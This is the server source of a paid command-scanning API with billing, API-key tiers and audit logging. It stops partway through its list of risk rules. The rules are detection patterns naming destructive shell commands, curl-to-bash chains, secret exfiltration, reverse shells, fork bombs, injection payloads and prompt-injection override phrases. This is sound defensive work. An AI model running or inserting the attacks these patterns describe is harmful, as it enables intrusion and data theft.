/*
  TEOS Sentinel v2.4 — Monetized SaaS + Dodo Billing + Tiered Auth + Supabase Audit
  Deployment: Vercel serverless (primary) + Railway (via ws-server)
  Data store: Upstash Redis (serverless) + Supabase Postgres (audit persistence)

  Hardening layers:
    1. Structured JSON logging with request IDs
    2. Redis-backed tiered rate limiting (survives cold starts)
    3. X-API-Key authentication with tier enforcement
    4. Supabase Postgres audit log persistence (zero data loss across deploys)
    5. Server-Sent Events (SSE) for real-time dashboard streaming
    6. Input validation + sanitization
    7. Payload size limits
    8. Security headers
    9. Request timing metrics
    10. Graceful error handling
    11. Redis boot-time tracking for uptime persistence
    12. Dodo Payments webhook HMAC verification + idempotency
*/

const express = require('express');
const crypto  = require('crypto');
const fs      = require('fs');
const path    = require('path');
const app     = express();

// ── CONFIG ──────────────────────────────────────────────────
const PORT            = process.env.PORT || 3000;
const MAX_EVENTS      = parseInt(process.env.MAX_EVENTS)        || 500;
const RATE_LIMIT_WIN  = parseInt(process.env.RATE_LIMIT_WIN)    || 60;
const MAX_PAYLOAD_KB  = parseInt(process.env.MAX_PAYLOAD_KB)    || 64;
const NODE_ENV        = process.env.NODE_ENV                    || 'development';
const REDIS_KEY       = 'teos:sentinel:events';
const BOOT_KEY        = 'teos:sentinel:boot_time';
const RL_PREFIX       = 'teos:rl:';
const API_KEY_PREFIX  = 'teos:apikey:';

let webhookTotal     = 0;
let webhookProcessed = 0;
let webhookFailed    = 0;

const TIERS = {
  free:       { rpm: 5,    rpd: 100,   label: 'Free',       scans: 50,     price: 0 },
  starter:    { rpm: 30,   rpd: 5000,  label: 'Starter',    scans: 5000,   price: 29 },
  team:       { rpm: 150,  rpd: 50000, label: 'Team',       scans: 50000,  price: 149 },
  enterprise: { rpm: 600,  rpd: -1,    label: 'Enterprise', scans: -1,     price: 499 },
  sovereign:  { rpm: -1,   rpd: -1,    label: 'Sovereign',  scans: -1,     price: 25000 },
};

// ── REDIS (Upstash) — shared store across bot + API + WS ────
let redis = null;
try {
  if (process.env.UPSTASH_REDIS_REST_URL && process.env.UPSTASH_REDIS_REST_TOKEN) {
    const { Redis } = require('@upstash/redis');
    redis = new Redis({
      url:   process.env.UPSTASH_REDIS_REST_URL,
      token: process.env.UPSTASH_REDIS_REST_TOKEN,
    });
    console.log('[teos] Upstash Redis connected');
  }
} catch (e) {
  console.warn('[teos] Redis init failed, falling back to memory:', e.message);
}

// ── SUPABASE (Postgres) — persistent audit log storage ──────
let supabase = null;
try {
  if (process.env.SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY) {
    const { createClient } = require('@supabase/supabase-js');
    supabase = createClient(
      process.env.SUPABASE_URL,
      process.env.SUPABASE_SERVICE_ROLE_KEY
    );
    console.log('[teos] Supabase connected');
  }
} catch (e) {
  console.warn('[teos] Supabase init failed, audit logs will use Redis fallback:', e.message);
}

// ── DODO PAYMENTS — billing + subscriptions ─────────────────
let dodo = null;
let dodoClient = null;
try {
  if (process.env.DODO_PAYMENTS_API_KEY) {
    dodo = require('dodopayments');
    const DodoPayments = dodo.default || dodo;
    dodoClient = new DodoPayments({
      bearerToken: process.env.DODO_PAYMENTS_API_KEY,
      environment: process.env.DODO_PAYMENTS_ENVIRONMENT || 'test_mode',
      webhookKey: process.env.DODO_PAYMENTS_WEBHOOK_KEY || '',
    });
    console.log('[teos] Dodo Payments initialized');
  }
} catch (e) {
  console.warn('[teos] Dodo init failed, billing unavailable:', e.message);
}

const DODO_PRODUCTS = {
  // Cloud — Free
  free_monthly:             process.env.DODO_PRODUCT_FREE_MONTHLY             || '',
  // Cloud — Starter
  starter_setup:           process.env.DODO_PRODUCT_STARTER_SETUP           || '',
  starter_monthly:         process.env.DODO_PRODUCT_STARTER_MONTHLY         || '',
  starter_annual:          process.env.DODO_PRODUCT_STARTER_ANNUAL          || '',
  // Cloud — Team
  team_setup:              process.env.DODO_PRODUCT_TEAM_SETUP              || '',
  team_monthly:            process.env.DODO_PRODUCT_TEAM_MONTHLY            || '',
  team_annual:             process.env.DODO_PRODUCT_TEAM_ANNUAL             || '',
  // Cloud — Enterprise
  enterprise_setup:        process.env.DODO_PRODUCT_ENTERPRISE_SETUP        || '',
  enterprise_monthly:      process.env.DODO_PRODUCT_ENTERPRISE_MONTHLY      || '',
  enterprise_annual:       process.env.DODO_PRODUCT_ENTERPRISE_ANNUAL       || '',
  // Sovereign
  sovereign_base:          process.env.DODO_PRODUCT_SOVEREIGN_BASE          || '',
  sovereign_additional:    process.env.DODO_PRODUCT_SOVEREIGN_ADDITIONAL_SITE || '',
  sovereign_rules:         process.env.DODO_PRODUCT_SOVEREIGN_CUSTOM_RULES  || '',
  sovereign_onsite:        process.env.DODO_PRODUCT_SOVEREIGN_ONSITE_DEPLOYMENT || '',
  sovereign_support:       process.env.DODO_PRODUCT_SOVEREIGN_SUPPORT_SLA   || '',
  sovereign_escrow:        process.env.DODO_PRODUCT_SOVEREIGN_SOURCE_ESCROW || '',
};

const TIER_PRICING = {
  free:      { setup: 0,       monthly: 0,       annual: 0,       label: 'Free',      scans: 50,       rpm: 5 },
  starter:   { setup: 50000,   monthly: 2900,     annual: 29000,    label: 'Starter',   scans: 5000,     rpm: 30 },
  team:      { setup: 200000,  monthly: 14900,    annual: 149000,   label: 'Team',      scans: 50000,    rpm: 150 },
  enterprise:{ setup: 500000,  monthly: 49900,    annual: 499000,   label: 'Enterprise',scans: -1,       rpm: 600 },
  sovereign: { setup: 0,        monthly: 0,        annual: 2500000, label: 'Sovereign', scans: -1,       rpm: -1 },
};

// ── AUDIT LOG SERVICE ───────────────────────────────────────
async function writeAuditLog(entry) {
  if (supabase) {
    try {
      const { error } = await supabase.from('audit_logs').insert({
        request_id: entry.requestId,
        user_id: entry.userId || 'anonymous',
        timestamp: new Date(entry.timestamp).toISOString(),
        verdict: entry.verdict,
        rule_id: entry.ruleId || 'R00',
        rule_name: entry.rule || 'R00.CLEAN',
        risk_score: entry.score || 0,
        command_hash: entry.commandHash || crypto.createHash('sha256').update(entry.command || '').digest('hex'),
        context: entry.type || 'shell',
        tier: entry.tier || 'free',
        metadata: {
          agentId: entry.agentId || null,
          severity: entry.severity || 'none',
          reasons: entry.reasons || [],
          command: (entry.command || '').slice(0, 500),
        },
      });
      if (error) {
        log('warn', 'Supabase audit write failed', { error: error.message });
      } else {
        return;
      }
    } catch (e) {
      log('warn', 'Supabase audit exception', { error: e.message });
    }
  }

  // Fallback: cache in Redis (short-term, dashboard-visible)
  if (redis) {
    try {
      const cacheKey = `audit:${entry.requestId}`;
      await redis.set(cacheKey, JSON.stringify(entry), { ex: 86400 });
      await redis.lpush('teos:sentinel:recent_audits', JSON.stringify(entry));
      await redis.ltrim('teos:sentinel:recent_audits', 0, 499);
    } catch (e) {
      log('warn', 'Redis audit fallback failed', { error: e.message });
    }
  }
}

async function queryAuditLogs(filters = {}) {
  const { verdict, ruleId, limit = 100, offset = 0, startDate, endDate } = filters;

  if (supabase) {
    try {
      let query = supabase.from('audit_logs').select('*', { count: 'exact' });
      if (verdict) query = query.eq('verdict', verdict);
      if (ruleId) query = query.eq('rule_id', ruleId);
      if (startDate) query = query.gte('timestamp', startDate);
      if (endDate) query = query.lte('timestamp', endDate);

      const { data, count, error } = await query
        .order('timestamp', { ascending: false })
        .range(offset, offset + limit - 1);

      if (!error) {
        return { total: count || 0, entries: data || [], store: 'supabase' };
      }
    } catch (e) {
      log('warn', 'Supabase audit query failed', { error: e.message });
    }
  }

  // Fallback: Redis recent audits
  if (redis) {
    try {
      const raw = await redis.lrange('teos:sentinel:recent_audits', offset, offset + limit - 1);
      const entries = raw.map(e => {
        try { return typeof e === 'string' ? JSON.parse(e) : e; } catch { return null; }
      }).filter(Boolean);

      let filtered = entries;
      if (verdict) filtered = filtered.filter(e => e.verdict === verdict);
      if (ruleId) filtered = filtered.filter(e => e.ruleId === ruleId);

      return { total: filtered.length, entries: filtered, store: 'redis-fallback' };
    } catch (e) {
      log('warn', 'Redis audit fallback query failed', { error: e.message });
    }
  }

  return { total: 0, entries: [], store: 'unavailable' };
}

async function getAuditSummary(days = 30) {
  if (supabase) {
    try {
      const startDate = new Date();
      startDate.setDate(startDate.getDate() - days);
      const { data, error } = await supabase
        .from('audit_logs')
        .select('verdict, risk_score')
        .gte('timestamp', startDate.toISOString());

      if (!error && data) {
        const total = data.length;
        const blocks = data.filter(d => d.verdict === 'BLOCK').length;
        const warns = data.filter(d => d.verdict === 'WARN').length;
        const allows = data.filter(d => d.verdict === 'ALLOW').length;
        const avgRiskScore = total > 0 ? data.reduce((sum, d) => sum + d.risk_score, 0) / total : 0;
        return { period: `last ${days} days`, total, blocks, warns, allows, avgRiskScore: Math.round(avgRiskScore * 100) / 100, store: 'supabase' };
      }
    } catch (e) {
      log('warn', 'Supabase summary query failed', { error: e.message });
    }
  }

  // Fallback: compute from Redis events
  const events = await loadEvents();
  const total = events.length;
  const blocks = events.filter(e => e.verdict === 'BLOCK').length;
  const warns = events.filter(e => e.verdict === 'WARN').length;
  const allows = events.filter(e => e.verdict === 'ALLOW').length;
  const avgRiskScore = total > 0 ? events.reduce((sum, e) => sum + (e.score || 0), 0) / total : 0;
  return { period: `last ${days} days (approx)`, total, blocks, warns, allows, avgRiskScore: Math.round(avgRiskScore * 100) / 100, store: 'memory-fallback' };
}

// ── BILLING SERVICE (Dodo) ──────────────────────────────────
async function createCheckoutSession({ email, name, tier, type = 'monthly', isAnnual = false }) {
  // Free tier — no checkout needed
  if (tier === 'free') {
    return { checkoutUrl: null, sessionId: null, tier: 'free', message: 'Free tier activated' };
  }

  // Sovereign tier — special handling
  if (tier === 'sovereign') {
    let productId;
    switch (type) {
      case 'base':       productId = DODO_PRODUCTS.sovereign_base;       break;
      case 'additional': productId = DODO_PRODUCTS.sovereign_additional; break;
      case 'rules':      productId = DODO_PRODUCTS.sovereign_rules;      break;
      case 'onsite':     productId = DODO_PRODUCTS.sovereign_onsite;     break;
      case 'support':    productId = DODO_PRODUCTS.sovereign_support;    break;
      case 'escrow':     productId = DODO_PRODUCTS.sovereign_escrow;     break;
      default:            return { error: 'invalid_type', message: `Invalid sovereign product type: ${type}` };
    }

    if (!productId) return { error: 'product_not_configured', message: `Sovereign product not configured for ${type}` };

    try {
      const session = await dodoClient.checkout.sessions.create({
        customer: { email, name },
        product_cart: [{ product_id: productId, quantity: 1 }],
        return_url: process.env.DODO_RETURN_URL || 'https://sentinel.teosegypt.com',
      });
      return { checkoutUrl: session.checkout_url, sessionId: session.id, tier: 'sovereign', type };
    } catch (e) {
      log('error', 'Dodo sovereign checkout failed', { error: e.message });
      return { error: 'checkout_failed', message: e.message };
    }
  }

  // Cloud tier
  let productKey;
  if (isAnnual) {
    productKey = `${tier}_annual`;
  } else if (type === 'setup') {
    productKey = `${tier}_setup`;
  } else {
    productKey = `${tier}_monthly`;
  }

  const productId = DODO_PRODUCTS[productKey];
  if (!productId) return { error: 'invalid_tier', message: `No product configured for ${tier} (${productKey})` };

  try {
    const session = await dodoClient.checkout.sessions.create({
      customer: { email, name },
      product_cart: [{ product_id: productId, quantity: 1 }],
      return_url: process.env.DODO_RETURN_URL || 'https://sentinel.teosegypt.com',
    });

    return { checkoutUrl: session.checkout_url, sessionId: session.id, tier, type: productKey };
  } catch (e) {
    log('error', 'Dodo checkout failed', { error: e.message });
    return { error: 'checkout_failed', message: e.message };
  }
}

async function logUsage(keyId, endpoint, verdict, reqId) {
  if (supabase) {
    try {
      await supabase.from('usage_logs').insert({
        key_id: keyId,
        endpoint,
        verdict,
        req_id: reqId,
      });
    } catch (e) {
      log('warn', 'Usage log failed', { error: e.message });
    }
  }
}

async function getUsageStats(keyId, days = 30) {
  if (!supabase) return { total: 0, blocks: 0, warns: 0, allows: 0 };
  try {
    const startDate = new Date();
    startDate.setDate(startDate.getDate() - days);
    const { data, error } = await supabase
      .from('usage_logs')
      .select('verdict')
      .eq('key_id', keyId)
      .gte('timestamp', startDate.toISOString());

    if (error || !data) return { total: 0, blocks: 0, warns: 0, allows: 0 };
    const total = data.length;
    return {
      total,
      blocks: data.filter(d => d.verdict === 'BLOCK').length,
      warns: data.filter(d => d.verdict === 'WARN').length,
      allows: data.filter(d => d.verdict === 'ALLOW').length,
      period: `last ${days} days`,
    };
  } catch (e) {
    log('warn', 'Failed to fetch usage stats', { error: e.message, keyId, days });
    return { total: 0, blocks: 0, warns: 0, allows: 0 };
  }
}

async function handleDodoWebhook(payload) {
  const { type, data } = payload;

  switch (type) {
    case 'payment.succeeded': {
      const { customer_id, subscription_id } = data;
      if (customer_id && supabase) {
        const { data: keyData } = await supabase
          .from('api_keys')
          .select('id, tier, metadata')
          .eq('dodo_customer_id', customer_id)
          .single();
        if (keyData) {
          const newTier = (keyData.metadata?.requestedTier) || 'starter';
          await supabase.from('api_keys').update({ tier: newTier, status: 'active' }).eq('id', keyData.id);
          log('info', 'Key upgraded via payment', { keyId: keyData.id, tier: newTier });
        }
      }
      break;
    }

    case 'subscription.active': {
      const { id: subId, customer_id, plan } = data;
      if (supabase) {
        await supabase.from('subscriptions').upsert({
          dodo_subscription_id: subId,
          dodo_customer_id: customer_id,
          plan_name: plan?.name || 'unknown',
          status: 'active',
          amount_cents: plan?.amount || 0,
          interval: plan?.interval,
          current_period_start: new Date(),
          current_period_end: new Date(Date.now() + 30 * 86400000),
        }, { onConflict: 'dodo_subscription_id' });

        const { data: keyData } = await supabase
          .from('api_keys')
          .select('id')
          .eq('dodo_customer_id', customer_id)
          .single();

        if (keyData) {
          const tierFromPlan = (plan?.name || '').toLowerCase().includes('pro') ? 'pro'
            : (plan?.name || '').toLowerCase().includes('enterprise') ? 'enterprise' : 'starter';
          await supabase.from('api_keys').update({ tier: tierFromPlan, status: 'active' }).eq('id', keyData.id);
        }
      }
      break;
    }

    case 'subscription.on_hold':
    case 'subscription.failed':
    case 'subscription.expired': {
      const { customer_id } = data;
      if (supabase && customer_id) {
        await supabase.from('api_keys').update({ status: 'suspended' }).eq('dodo_customer_id', customer_id);
        log('warn', 'Key suspended due to subscription issue', { customerId: customer_id });
      }
      break;
    }

    case 'subscription.cancelled': {
      const { customer_id } = data;
      if (supabase && customer_id) {
        await supabase.from('api_keys').update({ status: 'cancelled', tier: 'free' }).eq('dodo_customer_id', customer_id);
        log('info', 'Key downgraded to free after cancellation', { customerId: customer_id });
      }
      break;
    }
  }
}

const processedWebhooks = new Set();

app.post('/webhook/dodo', express.raw({ type: 'application/json' }), async (req, res) => {
  webhookTotal++;

  if (!dodoClient || !process.env.DODO_PAYMENTS_WEBHOOK_KEY) {
    log('warn', 'Dodo webhook received but not configured');
    return res.status(500).json({ error: 'webhook_not_configured' });
  }

  const rawBody = req.body.toString();
  const webhookId = req.headers['webhook-id'] || '';
  const signature = req.headers['webhook-signature'] || '';
  const timestamp = req.headers['webhook-timestamp'] || '';

  if (processedWebhooks.has(webhookId)) {
    log('info', 'Duplicate webhook skipped', { webhookId });
    return res.status(200).json({ received: true, duplicate: true });
  }

  const eventTime = parseInt(timestamp) * 1000;
  if (Math.abs(Date.now() - eventTime) > 300000) {
    log('warn', 'Webhook timestamp too old', { timestamp });
    return res.status(401).json({ error: 'timestamp_too_old' });
  }

  try {
    const unwrapped = dodoClient.webhooks.unwrap(rawBody, {
      headers: {
        'webhook-id': webhookId,
        'webhook-signature': signature,
        'webhook-timestamp': timestamp,
      },
    });

    processedWebhooks.add(webhookId);
    setTimeout(() => processedWebhooks.delete(webhookId), 3600000);

    log('info', 'Dodo webhook verified', { type: unwrapped.type, webhookId });

    webhookProcessed++;
    handleDodoWebhook(unwrapped).catch(e => {
      webhookFailed++;
      log('error', 'Dodo webhook processing failed', { error: e.message, webhookId });
    });

    res.status(200).json({ received: true });
  } catch (e) {
    log('warn', 'Dodo webhook signature verification failed', { error: e.message, webhookId });
    res.status(401).json({ error: 'invalid_signature' });
  }
});

// ── STRUCTURED LOGGER ───────────────────────────────────────
function log(level, msg, meta = {}) {
  const entry = {
    ts:   new Date().toISOString(),
    level,
    msg,
    env:  NODE_ENV,
    pid:  process.pid,
    ...meta,
  };
  if (level === 'error') console.error(JSON.stringify(entry));
  else if (level === 'warn') console.warn(JSON.stringify(entry));
  else console.log(JSON.stringify(entry));
}

// ── SSE EVENT STREAM (real-time dashboard) ─────────────────
const sseClients = new Set();

function broadcastEvent(event) {
  const data = `data: ${JSON.stringify(event)}\n\n`;
  for (const res of sseClients) {
    try { res.write(data); } catch {}
  }
}

// Expose for ws-server compatibility
global.emitScanEvent = (result) => broadcastEvent(result);

function sseMiddleware(req, res, next) {
  if (req.path === '/events/stream' && req.method === 'GET') {
    res.writeHead(200, {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      'Connection': 'keep-alive',
      'X-Accel-Buffering': 'no',
    });

    res.write(`data: ${JSON.stringify({ type: 'connected', message: 'Subscribed to TEOS event stream', tier: req.apiTier })}\n\n`);

    sseClients.add(res);

    req.on('close', () => {
      sseClients.delete(res);
      res.end();
    });

    req.on('abort', () => {
      sseClients.delete(res);
      res.end();
    });

    return;
  }
  next();
}

app.use(sseMiddleware);

// ── SECURITY MIDDLEWARE ─────────────────────────────────────
app.use(express.json({ limit: MAX_PAYLOAD_KB + 'kb' }));
app.use(express.urlencoded({ extended: false, limit: MAX_PAYLOAD_KB + 'kb' }));

// Security headers on every response
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options',    'nosniff');
  res.setHeader('X-Frame-Options',           'DENY');
  res.setHeader('X-XSS-Protection',          '0');
  res.setHeader('Cache-Control',             'no-store, no-cache, must-revalidate');
  res.setHeader('X-Request-ID',             req.id || crypto.randomUUID());
  next();
});

// CORS
app.use((req, res, next) => {
  const allowed = process.env.CORS_ORIGIN || '*';
  res.setHeader('Access-Control-Allow-Origin',  allowed);
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization,X-Request-ID,X-API-Key');
  res.setHeader('Access-Control-Expose-Headers', 'X-Request-ID');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

// Request ID + timing
app.use((req, res, next) => {
  req.id   = req.headers['x-request-id'] || crypto.randomUUID().slice(0, 16);
  req._t0  = process.hrtime.bigint();
  res.on('finish', () => {
    const elapsed = Number(process.hrtime.bigint() - req._t0) / 1e6;
    log('info', `${req.method} ${req.path}`, {
      reqId:    req.id,
      status:   res.statusCode,
      duration: Math.round(elapsed),
      ip:       req.ip || req.socket.remoteAddress,
      ua:       req.headers['user-agent']?.slice(0, 120) || '-',
    });
  });
  next();
});

// ── API KEY AUTH ─────────────────────────────────────────────
const VALID_KEYS = process.env.TEOS_API_KEYS
  ? process.env.TEOS_API_KEYS.split(',').map(k => k.trim())
  : (NODE_ENV === 'development' ? ['dev-key-free-001'] : []);

const KEY_TIER_MAP = {};
VALID_KEYS.forEach(k => {
  if (k.includes('-enterprise')) KEY_TIER_MAP[k] = 'enterprise';
  else if (k.includes('-pro')) KEY_TIER_MAP[k] = 'pro';
  else if (k.includes('-starter')) KEY_TIER_MAP[k] = 'starter';
  else KEY_TIER_MAP[k] = 'free';
});

async function resolveKeyTier(apiKey) {
  if (KEY_TIER_MAP[apiKey]) return KEY_TIER_MAP[apiKey];
  if (redis) {
    try {
      const tier = await redis.get(`${API_KEY_PREFIX}${apiKey}`);
      if (tier && TIERS[tier]) return tier;
    } catch {}
  }
  if (supabase) {
    try {
      const keyHash = crypto.createHash('sha256').update(apiKey).digest('hex');
      const { data } = await supabase
        .from('api_keys')
        .select('tier, status')
        .eq('key_hash', keyHash)
        .single();
      if (data && data.status === 'active' && TIERS[data.tier]) {
        return data.tier;
      }
      if (data && data.status === 'suspended') {
        return 'suspended';
      }
    } catch {}
  }
  return null;
}

async function resolveKeyId(apiKey) {
  if (supabase) {
    try {
      const keyHash = crypto.createHash('sha256').update(apiKey).digest('hex');
      const { data } = await supabase
        .from('api_keys')
        .select('id')
        .eq('key_hash', keyHash)
        .single();
      return data?.id || null;
    } catch {}
  }
  return null;
}

async function apiKeyAuth(req, res, next) {
  // Public routes — no auth required
  if (req.path === '/billing/pricing') return next();
  if (req.path === '/billing/checkout' && req.method === 'POST') return next();
  // Dashboard monitoring — read-only, no auth required
  if (req.path === '/stats' || req.path === '/events' || req.path === '/health' || req.path === '/openapi-spec.yaml') return next();

  const apiKey = req.headers['x-api-key'] || req.query.apiKey;
  if (!apiKey) {
    return res.status(401).json({
      error: 'missing_api_key',
      message: 'Provide X-API-Key header or ?apiKey= query parameter (for SSE).',
    });
  }

  const tier = await resolveKeyTier(apiKey);
  if (!tier) {
    return res.status(403).json({
      error: 'invalid_api_key',
      message: 'API key not recognized',
    });
  }

  req.apiKey = apiKey;
  req.apiTier = tier;
  next();
}

// ── REDIS-BACKED TIERED RATE LIMITER ────────────────────────
const rateStore = new Map();

async function redisRateLimiter(req, res, next) {
  if (NODE_ENV === 'test' || process.env.DISABLE_RATE_LIMIT) return next();

  const tier = req.apiTier || 'free';
  const limits = TIERS[tier] || TIERS.free;
  const identifier = req.apiKey ? `key:${req.apiKey}` : (req.ip || req.socket.remoteAddress || 'unknown');

  const now = Math.floor(Date.now() / 1000);
  const minuteKey = `${RL_PREFIX}${identifier}:m:${Math.floor(now / 60)}`;
  const dayKey    = `${RL_PREFIX}${identifier}:d:${Math.floor(now / 86400)}`;

  if (redis) {
    try {
      const [minuteCount, dayCount] = await Promise.all([
        redis.incr(minuteKey),
        redis.incr(dayKey),
      ]);
      await redis.expire(minuteKey, 120);
      await redis.expire(dayKey, 172800);

      const remainingMinute = Math.max(0, limits.rpm - minuteCount);
      const remainingDay    = Math.max(0, limits.rpd - dayCount);

      res.setHeader('X-RateLimit-Limit-Minute', String(limits.rpm));
      res.setHeader('X-RateLimit-Limit-Day',     String(limits.rpd));
      res.setHeader('X-RateLimit-Remaining-Minute', String(remainingMinute));
      res.setHeader('X-RateLimit-Remaining-Day',    String(remainingDay));
      res.setHeader('X-RateLimit-Tier',             tier);

      if (minuteCount > limits.rpm) {
        res.setHeader('Retry-After', '60');
        return res.status(429).json({
          error:   'rate_limit_minute_exceeded',
          message: `Max ${limits.rpm} requests/minute for ${TIERS[tier].label} tier`,
          retryAfter: 60,
          tier,
        });
      }
      if (dayCount > limits.rpd) {
        res.setHeader('Retry-After', String(86400 - (now % 86400)));
        return res.status(429).json({
          error:   'rate_limit_day_exceeded',
          message: `Max ${limits.rpd} requests/day for ${TIERS[tier].label} tier`,
          retryAfter: 86400 - (now % 86400),
          tier,
        });
      }
      return next();
    } catch (e) {
      log('warn', 'Redis rate limiter failed, falling back to memory', { error: e.message });
    }
  }

  const key  = `rl:${identifier}`;
  let entry = rateStore.get(key);
  if (!entry || now - entry.windowStart > RATE_LIMIT_WIN) {
    entry = { windowStart: now, count: 0 };
    rateStore.set(key, entry);
  }
  entry.count++;
  if (entry.count > limits.rpm) {
    res.setHeader('X-RateLimit-Remaining', '0');
    res.setHeader('X-RateLimit-Reset', String(entry.windowStart + RATE_LIMIT_WIN));
    return res.status(429).json({
      error:   'rate_limit_exceeded',
      message: `Max ${limits.rpm} requests per ${RATE_LIMIT_WIN}s window (${TIERS[tier].label} tier, memory fallback)`,
      retryAfter: entry.windowStart + RATE_LIMIT_WIN - now,
      tier,
    });
  }
  res.setHeader('X-RateLimit-Remaining', String(limits.rpm - entry.count));
  res.setHeader('X-RateLimit-Limit', String(limits.rpm));
  res.setHeader('X-RateLimit-Tier', tier);
  next();
}

app.use(apiKeyAuth);
app.use(redisRateLimiter);

// Rate limit cleanup (memory fallback only)
setInterval(() => {
  const now = Math.floor(Date.now() / 1000);
  for (const [key, entry] of rateStore) {
    if (now - entry.windowStart > RATE_LIMIT_WIN * 2) rateStore.delete(key);
  }
}, 5 * 60 * 1000);

// ── DATA STORE (Redis primary, memory fallback) ─────────────
let memStore = [];

async function loadEvents() {
  if (redis) {
    try {
      const raw = await redis.lrange(REDIS_KEY, 0, MAX_EVENTS - 1);
      return raw.map(e => typeof e === 'string' ? JSON.parse(e) : e);
    } catch (e) {
      log('warn', 'Redis read failed, using memory fallback', { error: e.message });
    }
  }
  return memStore;
}

async function saveEvent(event) {
  if (redis) {
    try {
      await redis.lpush(REDIS_KEY, JSON.stringify(event));
      await redis.ltrim(REDIS_KEY, 0, MAX_EVENTS - 1);
      return;
    } catch (e) {
      log('warn', 'Redis write failed, using memory fallback', { error: e.message });
    }
  }
  memStore.unshift(event);
  if (memStore.length > MAX_EVENTS) memStore = memStore.slice(0, MAX_EVENTS);
}

// Backward-compatible sync wrappers for existing route code
function loadEventsSync() {
  return memStore;
}

function saveEventsSync(events) {
  memStore = events.slice(-MAX_EVENTS);
  return memStore;
}

// ── RISK ENGINE (25 deterministic rules) ────────────────────
const RULES = [
  { id:'R01', name:'DESTRUCTIVE_SHELL',    sev:'critical', score:100,
    test: c => /rm\s+-rf|format\s+[a-z]:|deltree/i.test(c),
    reasons: ['rm -rf permanently destroys all filesystem data','Wiper malware signature detected'] },

  { id:'R02', name:'CHMOD_ESCALATION',     sev:'critical', score:90,
    test: c => /chmod\s+[0-7]*7{2,}.*\/etc|777.*passwd/i.test(c),
    reasons: ['chmod 777 on sensitive system files escalates privileges'] },

  { id:'R03', name:'CURL_EXEC_CHAIN',      sev:'critical', score:95,
    test: c => /curl.+\|\s*(bash|sh)|wget.+\|\s*(bash|sh)/i.test(c),
    reasons: ['curl/wget piped to shell executes untrusted remote code'] },

  { id:'R04', name:'SECRET_ECHO',          sev:'critical', score:90,
    test: c => /echo\s+\$[A-Z_]*(KEY|TOKEN|SECRET|PASS|PWD)/i.test(c),
    reasons: ['Echoing secret environment variable — potential exfiltration'] },

  { id:'R05', name:'ENV_EXFIL',            sev:'critical', score:95,
    test: c => /\$[A-Z_]*(KEY|SECRET|TOKEN).*(curl|wget|http)/i.test(c),
    reasons: ['Sending environment secret to external host'] },

  { id:'R06', name:'FORK_BOMB',            sev:'critical', score:100,
    test: c => /(\:\(\)\{|:\(\))\s*\{.*:\|:/i.test(c),
    reasons: ['Fork bomb detected — denial of service pattern'] },

  { id:'R07', name:'BASE64_EXEC',          sev:'high',     score:88,
    test: c => /eval\s*\(\s*atob|base64\s+--decode.*(sh|bash|exec)/i.test(c),
    reasons: ['Base64-encoded payload executed via eval','Obfuscated execution bypass'] },

  { id:'R08', name:'REVERSE_SHELL',        sev:'critical', score:100,
    test: c => /nc\s+(-e|--exec)|bash\s+-i\s+>&\s*\/dev\/tcp/i.test(c),
    reasons: ['Reverse shell connection attempt detected'] },

  { id:'R09', name:'SQL_DESTRUCTION',      sev:'high',     score:75,
    test: c => /DROP\s+(TABLE|DATABASE|SCHEMA)|TRUNCATE\s+TABLE/i.test(c),
    reasons: ['SQL DROP command permanently destroys data'] },

  { id:'R10', name:'SQL_INJECTION',        sev:'high',     score:75,
    test: c => /'\s*(OR|AND)\s+\d=\d|UNION\s+SELECT|1=1/i.test(c),
    reasons: ['Classic SQL injection pattern detected'] },

  { id:'R11', name:'PATH_TRAVERSAL',       sev:'high',     score:78,
    test: c => /(\.\.\/){2,}|%2e%2e/i.test(c),
    reasons: ['Directory traversal detected in file path'] },

  { id:'R12', name:'COMMAND_INJECTION',    sev:'critical', score:92,
    test: c => /[;&|`]\s*(ls|cat|id|whoami|uname)/i.test(c),
    reasons: ['OS command injection via user-controlled input'] },

  { id:'R13', name:'PRIVILEGE_ESCALATION', sev:'critical', score:90,
    test: c => /sudo\s+(su|bash|sh|python|perl)|chmod\s+u\+s/i.test(c),
    reasons: ['Privilege escalation via sudo or SUID abuse'] },

  { id:'R14', name:'MALICIOUS_PACKAGE',    sev:'high',     score:85,
    test: c => /event-stream@3\.3\.6|flatmap-stream|ua-parser-js@0\.7\.2[89]/i.test(c),
    reasons: ['Known malicious npm package version detected'] },

  { id:'R15', name:'TYPOSQUAT_PACKAGE',    sev:'high',     score:70,
    test: c => /require\s*\(\s*['"](\slodash|recat|expres|mongoos)['"]\s*\)/i.test(c),
    reasons: ['Typosquatted package name detected'] },

  { id:'R16', name:'UNSAFE_PERMISSIONS',   sev:'medium',   score:65,
    test: c => /permissions:\s*write-all/i.test(c),
    reasons: ['GitHub Actions write-all permissions overly broad'] },

  { id:'R17', name:'CURL_BASH_CI',         sev:'critical', score:95,
    test: c => /run:\s*curl.+\|\s*bash/i.test(c),
    reasons: ['curl|bash in CI/CD pipeline step — remote code execution risk'] },

  { id:'R18', name:'PRIVILEGED_CONTAINER', sev:'high',     score:80,
    test: c => /--privileged|securityContext:\s*privileged:\s*true/i.test(c),
    reasons: ['Privileged container flag breaks container isolation'] },

  { id:'R19', name:'HARDCODED_SECRET',     sev:'critical', score:92,
    test: c => /(api_key|apikey|secret_key|password)\s*=\s*['"][a-z0-9]{12,}['"]/i.test(c),
    reasons: ['Hardcoded secret in source code detected'] },

  { id:'R20', name:'PROMPT_INJECTION',     sev:'high',     score:80,
    test: c => /ignore previous instructions|disregard your system prompt|jailbreak/i.test(c),
    reasons: ['LLM prompt injection attempt detected'] },

  { id:'R21', name:'SSRF_ATTEMPT',         sev:'high',     score:82,
    test: c => /https?:\/\/(169\.254|10\.|192\.168|172\.(1[6-9]|2\d|3[01]))/i.test(c),
    reasons: ['SSRF attempt targeting internal/metadata IP range'] },

  { id:'R22', name:'XXE_INJECTION',        sev:'high',     score:80,
    test: c => /<!ENTITY\s+\w+\s+SYSTEM/i.test(c),
    reasons: ['XML External Entity injection pattern detected'] },

  { id:'R23', name:'CRYPTO_MINER',         sev:'critical', score:95,
    test: c => /stratum\+tcp|xmrig|minerd|ethminer/i.test(c),
    reasons: ['Cryptomining binary or pool connection detected'] },

